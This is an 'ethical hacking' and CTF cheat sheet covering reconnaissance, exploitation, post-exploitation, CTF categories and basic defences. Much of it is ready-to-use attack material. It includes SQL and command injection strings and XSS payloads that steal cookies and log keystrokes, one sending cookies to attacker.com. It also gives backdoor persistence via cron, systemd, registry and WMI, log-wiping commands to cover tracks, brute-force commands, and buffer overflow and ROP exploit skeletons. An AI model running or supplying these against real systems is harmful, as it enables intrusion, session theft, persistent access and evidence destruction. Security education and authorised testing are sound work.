# 🎯 COMPLETE CTF & ETHICAL HACKING GUIDE
## All Challenge Types + 5-Phase Penetration Testing Framework

---

## 📚 TABLE OF CONTENTS

1. [5-Phase Ethical Hacking Framework](#5-phase-ethical-hacking-framework)
2. [CTF Challenge Categories](#ctf-challenge-categories)
3. [Cryptography Challenges](#cryptography-challenges)
4. [Web Exploitation](#web-exploitation)
5. [Reverse Engineering](#reverse-engineering)
6. [Forensics](#forensics)
7. [OSINT Techniques](#osint-techniques)
8. [Pwn/Binary Exploitation](#binary-exploitation)
9. [Social Engineering](#social-engineering)
10. [Tool Mastery Guide](#tool-mastery-guide)
11. [Real-World Scenarios](#real-world-scenarios)

---

## 🔄 5-PHASE ETHICAL HACKING FRAMEWORK

### Phase 1: RECONNAISSANCE (Information Gathering)

#### Passive Reconnaissance
```bash
# Domain enumeration
whois target.com
nslookup target.com
dig target.com

# Subdomain discovery
subfinder -d target.com
assetfinder --subs-only target.com
amass enum -d target.com

# Technology stack discovery
whatweb -v target.com
wappalyzer target.com
builtwith target.com

# Email harvesting
theHarvester -d target.com -b google
python3 recon-ng

# OSINT frameworks
python3 sherlock username
python3 instagrep
```

#### Active Reconnaissance (Information Gathering with Permission)
```bash
# Network scanning
nmap -sV -p- target.com
masscan -p1-65535 target.com --rate=1000

# Web application scanning
burpsuite  # Burp Community Edition
nikto -h target.com

# Port enumeration
nmap -sC -sV -p 22,80,443 target.com

# Service version detection
nmap -sV target.com
```

**Tools**: whois, nslookup, dig, subfinder, assetfinder, amass, whatweb, wappalyzer, nmap

---

### Phase 2: SCANNING & ENUMERATION

#### Vulnerability Scanning
```bash
# Nessus scanning
# 1. Launch Nessus
# 2. Create policy
# 3. Run scan
# 4. Export results

# OpenVAS (free alternative)
sudo openvas-setup
gvm-cli --gmp scripts list-configs

# Qualys QWEB (cloud-based)
# Web Application Scanning
```

#### Service Enumeration
```bash
# SMB enumeration
smbclient -L \\target.com
enum4linux -a target.com
crackmapexec smb target.com -u '' -p ''

# SSH enumeration
nmap -sV -p 22 target.com
ssh-keyscan target.com

# FTP enumeration
nmap -sV -p 21 target.com
ftp target.com

# LDAP enumeration
ldapsearch -x -H ldap://target.com -b "dc=target,dc=com"

# DNS enumeration
dnsenum target.com
dnsrecon -d target.com

# HTTP/HTTPS enumeration
curl -v http://target.com
ssl-test https://target.com
testssl.sh https://target.com
```

**Tools**: Nessus, OpenVAS, Nmap, enum4linux, crackmapexec, ldapsearch, dnsrecon

---

### Phase 3: EXPLOITATION

#### Web Application Exploitation
```bash
# SQL Injection
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page" --forms --batch

# Cross-Site Scripting (XSS)
# Payloads: <script>alert('XSS')</script>
# DOM-based: DOM injection points
# Test with Burp Collaborator

# Command Injection
; whoami
| id
& net user

# File Upload
# Bypass: .php.jpg, .phtml, double extension
# Check MIME type validation
# Test for webshell upload

# IDOR (Insecure Direct Object Reference)
# Modify IDs: /api/users/1 → /api/users/2
# Check authorization on resources
```

#### Network Exploitation
```bash
# Metasploit Framework
msfconsole
search module_name
use module_name
set RHOSTS target.com
set LHOST attacker_ip
exploit

# Password attacks
hydra -l admin -P /path/wordlist.txt ssh://target.com
medusa -h target.com -u admin -P wordlist.txt -M ssh

# Privilege escalation
# Linux: sudo -l, SUID binaries, kernel exploits
find / -perm -u=s -type f 2>/dev/null
cat /etc/sudoers

# Windows: UAC bypass, token impersonation, kernel exploits
whoami /priv
```

**Tools**: sqlmap, Burp Suite, Metasploit, hydra, medusa, Empire, BeEF

---

### Phase 4: POST-EXPLOITATION (Maintaining Access)

#### Persistence Mechanisms
```bash
# Linux persistence
# SSH key installation
mkdir ~/.ssh
echo "attacker_public_key" >> ~/.ssh/authorized_keys

# Cron job backdoor
(crontab -l; echo "*/5 * * * * /tmp/backdoor.sh") | crontab -

# Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /path/backdoor.py
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor.service

# Windows persistence
# Registry run keys
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d C:\backdoor.exe

# Scheduled task
schtasks /create /tn Backdoor /tr C:\backdoor.exe /sc minute /mo 5

# WMI event binding
wmic /namespace:"\\root\subscription" class __EventFilter create Name="Backdoor", EventNamespace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

#### Covering Tracks
```bash
# Log cleaning
# Linux
echo "" > /var/log/auth.log
history -c
cat /dev/null > ~/.bash_history

# Windows
wevtutil cl Security
wevtutil cl System
Remove-Item C:\Windows\System32\winevt\Logs\*.evtx

# Network logs
rm /var/log/syslog
```

---

### Phase 5: REPORTING & REMEDIATION

#### Vulnerability Report Template
```markdown
# Penetration Test Report
## Executive Summary
- Testing period: DATE
- Scope: IP ranges, domains
- Critical vulnerabilities found: N

## Findings
### Critical (CVSS 9.0-10.0)
- **Vulnerability**: Remote Code Execution
- **Location**: /admin/upload.php
- **Impact**: Full system compromise
- **Proof of Concept**: [details]
- **Remediation**: Update software to version X.X.X

### High (CVSS 7.0-8.9)
...

### Medium (CVSS 4.0-6.9)
...

### Low (CVSS 0.1-3.9)
...

## Remediation Timeline
- Critical: Within 24 hours
- High: Within 7 days
- Medium: Within 30 days
- Low: Within 90 days

## Verification
- [ ] Vulnerabilities patched
- [ ] Fix verified
- [ ] Re-testing completed
```

---

## 🎮 CTF CHALLENGE CATEGORIES

### 1. CRYPTOGRAPHY CHALLENGES

#### Caesar Cipher
```python
# Brute force Caesar cipher
def caesar_brute_force(ciphertext):
    for shift in range(26):
        plaintext = ""
        for char in ciphertext:
            if char.isalpha():
                shifted = chr((ord(char.upper()) - ord('A') - shift) % 26 + ord('A'))
                plaintext += shifted if char.isupper() else shifted.lower()
            else:
                plaintext += char
        print(f"Shift {shift}: {plaintext}")

# Example
caesar_brute_force("KHOOR ZRUOG")
```

#### Substitution Cipher
```python
# Frequency analysis
from collections import Counter

def frequency_analysis(ciphertext):
    freq = Counter(ciphertext.replace(' ', '').upper())
    sorted_freq = sorted(freq.items(), key=lambda x: x[1], reverse=True)
    
    english_freq = {'E': 11, 'T': 9, 'A': 8, 'O': 7, 'I': 7, 'N': 7, 'S': 6, 'H': 6, 'R': 6}
    
    mapping = {}
    for i, (char, count) in enumerate(sorted_freq):
        english_chars = sorted(english_freq.items(), key=lambda x: x[1], reverse=True)
        if i < len(english_chars):
            mapping[char] = english_chars[i][0]
    
    return mapping
```

#### RSA Attacks
```python
# RSA when p and q are close
# If p ≈ q, then p and q are close to sqrt(n)
def factor_close_primes(n):
    import math
    x = math.isqrt(n)
    
    while True:
        y_squared = x * x - n
        y = math.isqrt(y_squared)
        
        if y * y == y_squared:
            p = x + y
            q = x - y
            return p, q
        x += 1

# RSA with common modulus
# If gcd(e1, e2) = 1, we can recover message
# Find s, t such that: e1*s + e2*t = 1
# Then: m = (c1^s * c2^t) mod n

# Hastad's broadcast attack
# If same message encrypted with multiple e's and n's
# Use Chinese Remainder Theorem to recover message
```

#### Hash Cracking
```bash
# John the Ripper
john --format=sha512 hashes.txt
john --wordlist=/path/wordlist.txt hashes.txt

# Hashcat
hashcat -m 1000 hashes.txt wordlist.txt  # NTLM
hashcat -m 1400 hashes.txt wordlist.txt  # SHA256
hashcat -m 1700 hashes.txt wordlist.txt  # SHA512

# Online databases
# https://crackstation.net
# https://md5.gromweb.com
# https://reverse.intigriti.io
```

#### AES Encryption Attacks
```python
# ECB mode weakness (deterministic encryption)
# If same plaintext → same ciphertext, reveals patterns

# CBC mode padding oracle attack
# Use padding error to decrypt data bit by bit

# GCM mode nonce reuse
# If nonce reused, attacker can recover key
def gcm_nonce_reuse_attack(c1, c2, a1, a2):
    # If nonce is reused with same key
    # XOR of ciphertexts reveals information
    return bytes(x ^ y for x, y in zip(c1, c2))
```

**CTF Crypto Tools**: 
- RsaCtfTool
- FactorDb
- CyberChef
- Hashpumpy
- John the Ripper
- Hashcat

---

### 2. WEB EXPLOITATION

#### SQL Injection
```sql
-- Detect SQL injection
' OR '1'='1
' OR 1=1 --
' OR 'a'='a
admin' --

-- Extract databases
' UNION SELECT NULL, table_schema FROM information_schema.tables --
' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=database() --
' UNION SELECT NULL, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' --

-- Blind SQL injection
' AND 1=1 -- (True)
' AND 1=2 -- (False)
' AND SUBSTRING(password,1,1)='a' -- (Conditional)

-- Time-based blind SQLi
' AND SLEEP(5) --
' AND IF(1=1, SLEEP(5), 0) --
```

#### XSS (Cross-Site Scripting)
```javascript
// Stored XSS
<script>
  fetch('/steal-cookies', {
    method: 'POST',
    body: JSON.stringify({cookie: document.cookie})
  })
</script>

// Reflected XSS
<img src=x onerror="alert('XSS')">
<svg/onload="alert('XSS')">
<iframe src="javascript:alert('XSS')">

// DOM-based XSS
// Payload: <img src=x onerror="fetch('/steal?cookie='+document.cookie)">

// Keylogger payload
<script>
  document.addEventListener('keypress', (e) => {
    fetch('/log?key=' + e.key);
  });
</script>

// Session hijacking
<script>
  new Image().src = 'http://attacker.com/steal.php?cookie=' + document.cookie;
</script>
```

#### IDOR (Insecure Direct Object Reference)
```bash
# Enumerate resource IDs
/api/users/1
/api/users/2
/api/users/3
...

# Extract information
curl -H "Authorization: Bearer TOKEN" https://target.com/api/users/999

# Modify resources
curl -X PUT -H "Authorization: Bearer TOKEN" \
  -d '{"role":"admin"}' \
  https://target.com/api/users/999

# Bypass authorization checks
/admin/users/delete?id=1  # As regular user
```

#### Authentication Bypass
```bash
# Default credentials
admin/admin
admin/password
admin/12345

# SQL injection in login
' OR '1'='1
admin' --
' UNION SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' --

# JWT token bypass
# No signature verification: Modify payload, remove signature
# Weak secret: Brute force
# Kid injection: Directory traversal in 'kid' parameter

# Session fixation
# Set session cookie before login
# User logs in with attacker's session

# Parameter pollution
# ?admin=false&admin=true
# Different parsers interpret differently
```

**CTF Web Tools**:
- Burp Suite
- OWASP ZAP
- sqlmap
- Nikto
- wfuzz
- Dirb
- CyberChef

---

### 3. REVERSE ENGINEERING

#### Static Analysis
```bash
# Disassembly
objdump -d binary > assembly.txt
gdb ./binary
radare2 binary
ghidra binary

# Strings extraction
strings binary
strings -a binary | grep -i flag

# Symbol analysis
nm binary
readelf -s binary
```

#### Dynamic Analysis
```bash
# GDB debugging
gdb ./binary
(gdb) break main
(gdb) run
(gdb) step
(gdb) nexti
(gdb) info registers
(gdb) x/100x $esp

# Trace syscalls
strace ./binary
ltrace ./binary

# Monitor process
ps aux | grep binary
proc/$PID/maps
```

#### Reverse Engineering Techniques
```python
# Find main function
# Look for: mov ebp, esp (function prologue)
# Follow call chains

# Find string references
# Check .rodata section
# Follow xref to code

# Identify algorithms
# Look for loop patterns
# Check mathematical operations

# Patch binary
# Find instruction to modify
# Use hex editor or radare2
# re2patch

# Unpack compressed binary
# Check entropy
# Use upx -d binary

# Decode obfuscation
# Look for XOR patterns
# Identify decryption routines
# Write Python script to decode
```

**Reverse Engineering Tools**:
- Ghidra
- IDA Pro / IDA Free
- Radare2
- Hopper
- Binary Ninja
- Angr (binary analysis)
- Capstone (disassembly)

---

### 4. FORENSICS

#### File Analysis
```bash
# File type detection
file filename
strings filename

# Metadata extraction
exiftool image.jpg
binwalk image.jpg

# Carving deleted files
foremost image.img
scalpel image.img

# Check file signatures
hexdump -C filename | head
xxd filename | head
```

#### Memory Forensics
```bash
# Dump memory
dd if=/dev/mem of=memory.dump
tar -czf memory.tar.gz /proc

# Analyze with Volatility
volatility -f memory.dump imageinfo
volatility -f memory.dump pslist
volatility -f memory.dump memdump -p PID -D output/
volatility -f memory.dump netscan
```

#### Disk Forensics
```bash
# Mount image
mount -o loop image.img /mnt

# Partition analysis
fdisk -l image.img
parted image.img

# Filesystem analysis
fsstat image.img
fls -r image.img
icat image.img inode_number

# Recover files
foremost -i image.img -o output
```

#### Steganography
```bash
# Image steganography
steghide extract -sf image.jpg -p password

# Metadata hiding
exiftool -Comment="hidden data" image.jpg

# LSB steganography
python3 << EOF
from PIL import Image
import numpy as np

img = Image.open('image.png')
pixels = np.array(img)

# Extract LSB
message_bits = ""
for pixel in pixels.flatten():
    message_bits += str(pixel & 1)

# Convert bits to message
message = ""
for i in range(0, len(message_bits), 8):
    byte = message_bits[i:i+8]
    message += chr(int(byte, 2))

print(message)
EOF

# Audio steganography
sox original.wav hidden.wav remix 1 phaseout
sox hidden.wav -n stat
```

**Forensics Tools**:
- Volatility
- Foremost
- Sleuth Kit (autopsy)
- Wireshark
- 010 Editor
- binwalk
- steghide
- Exiftool

---

### 5. OSINT TECHNIQUES

#### Email/User Discovery
```bash
# Email harvesting
theHarvester -d company.com -b google,bing,linkedin
phonebook.cz
hunter.io

# Username enumeration
sherlock username
instagram
twitter
github

# Social media
# Check LinkedIn for employees
# Extract department info
# Identify potential targets
```

#### Domain Intelligence
```bash
# WHOIS
whois domain.com
whois -h whois.arin.net IP_ADDRESS

# DNS
dig domain.com
nslookup domain.com
dnsenum domain.com
dnsrecon -d domain.com

# Subdomains
subfinder -d domain.com
assetfinder domain.com
amass enum -d domain.com
crt.sh (Certificate Transparency)
```

#### Technology Stack Discovery
```bash
# Web technologies
whatweb domain.com
wappalyzer domain.com
builtwith domain.com
retire.js (JavaScript libraries)

# Framework fingerprinting
# Drupal: CHANGELOG.txt, sites/default
# WordPress: wp-admin, wp-content
# Joomla: /administrator
```

#### Location Intelligence
```bash
# IP geolocation
geoip target.com
maxmind-geoip
geoiplookup IP_ADDRESS

# Photography metadata
exiftool photo.jpg
# Extract GPS coordinates if available
```

---

### 6. BINARY EXPLOITATION / PWN

#### Buffer Overflow
```python
# Simple overflow
#!/usr/bin/env python3
import subprocess
import struct

# Pattern detection
pattern = "Aa0Aa1Aa2Aa3Aa4..."
proc = subprocess.Popen(['./vulnerable'], stdin=subprocess.PIPE)
proc.communicate(pattern.encode())

# Finding offset
# Search for EIP value in pattern
offset = pattern_offset(eip_value)

# Constructing exploit
payload = b'A' * offset
payload += struct.pack('<I', return_address)
payload += shellcode

# Sending exploit
proc = subprocess.Popen(['./vulnerable'], stdin=subprocess.PIPE)
proc.communicate(payload)
```

#### Return-Oriented Programming (ROP)
```python
# Find ROP gadgets
ropper -f binary --search "pop rdi; ret"
ropgadget --binary binary | grep "pop rdi"

# ROP chain for x86-64
# 1. pop rdi; ret → set first argument
# 2. pop rsi; ret → set second argument
# 3. pop rdx; ret → set third argument
# 4. syscall or call function

# Example: execve("/bin/sh", NULL, NULL)
gadgets = {
    'pop_rdi': 0x400713,
    'pop_rsi': 0x400711,
    'pop_rdx': 0x400709,
    'syscall': 0x400700
}

rop_chain = struct.pack('<Q', gadgets['pop_rdi'])
rop_chain += struct.pack('<Q', bin_sh_addr)  # /bin/sh address
rop_chain += struct.pack('<Q', gadgets['pop_rsi'])
rop_chain += struct.pack('<Q', 0)  # NULL
rop_chain += struct.pack('<Q', gadgets['pop_rdx'])
rop_chain += struct.pack('<Q', 0)  # NULL
rop_chain += struct.pack('<Q', gadgets['syscall'])
```

#### Format String Attacks
```python
# Detect format string vulnerability
# %x prints stack values
# %n writes to memory

# Read from stack
payload = b'%08x.' * 10  # Read 10 stack values

# Write to memory (ASLR bypass needed)
payload = b'AAAA'  # Target address
payload += b'%x.' * (offset - 1)
payload += b'%n'  # Write EIP

# One-shot write
value = 0x08048000  # Target value
payload = struct.pack('<I', target_addr)
payload += b'%' + str(value - 4).encode() + b'd%n'
```

**Binary Exploitation Tools**:
- GDB
- Radare2
- pwntools
- ropper
- angr
- one_gadget
- checksec

---

### 7. SOCIAL ENGINEERING

#### Phishing
```python
# Email phishing
# Create convincing email with malicious link

# Vishing (voice phishing)
# Call target pretending to be support

# Smishing (SMS phishing)
# Send SMS with malicious link

# Spear phishing
# Targeted email with personalized information
```

#### Physical Security
```
# Tailgating
# Follow authorized person through door

# Dumpster diving
# Retrieve sensitive information from trash

# Badge cloning
# Clone RFID badge

# Lock picking
# Open physical locks
```

---

## 🛠️ TOOL MASTERY GUIDE

### Burp Suite Professional
```
1. Capture Mode
   - Intercept HTTP requests
   - Modify parameters
   - Send to Scanner

2. Scanner
   - Active scan
   - Passive scan
   - Audit findings

3. Repeater
   - Modify and resend requests
   - Test different payloads

4. Intruder
   - Brute force
   - Fuzzing
   - Parameter discovery

5. Collaborator
   - Out-of-band detection
   - XXE exploitation
   - DNS rebinding
```

### Metasploit Framework
```bash
# Basic commands
msfconsole
show exploits
show payloads
search module_name
use module_name
set OPTION value
exploit
run
```

### Wireshark
```bash
# Capture filters
tcp port 80
tcp.port == 443
ip.src == 192.168.1.100

# Display filters
http
ssh
dns
ftp

# Follow streams
tcp.stream eq 0
```

### OWASP ZAP
```bash
# Command line scanning
zaproxy.sh -cmd -quickurl http://target.com -quickout report.html

# API scanning
curl http://localhost:8080/scan
```

---

## 🌍 REAL-WORLD SCENARIOS

### Scenario 1: SQL Injection in Login
```
Target: http://target.com/login
Parameter: username

Attack:
1. Detect injection: admin' --
2. Extract database: ' UNION SELECT table_name FROM information_schema.tables --
3. Find users table: ' UNION SELECT username, password FROM users --
4. Get credentials
5. Login as admin
```

### Scenario 2: Stored XSS in Comments
```
Target: Comment field on blog

Payload:
<img src=x onerror="fetch('/steal-session', {
  method: 'POST',
  body: document.cookie
})">

Impact: Steal admin session cookies
```

### Scenario 3: IDOR in API
```
Target: /api/documents/123

Attack:
1. Enumerate IDs: /api/documents/1, /2, /3...
2. Access other users' documents
3. Find sensitive documents
4. Download and analyze
```

---

## 📊 MITIGATION & DEFENSE

### Input Validation
```python
# Validate input
def validate_username(username):
    if not username.isalnum():
        raise ValueError("Invalid username")
    if len(username) > 20:
        raise ValueError("Username too long")
    return username
```

### Parameterized Queries
```python
# Prevent SQL injection
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

### Output Encoding
```python
# Prevent XSS
from html import escape
safe_output = escape(user_input)
```

### Security Headers
```
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=31536000
```

---

**Last Updated**: June 2024
**Version**: 2.0
**Difficulty**: Beginner to Advanced
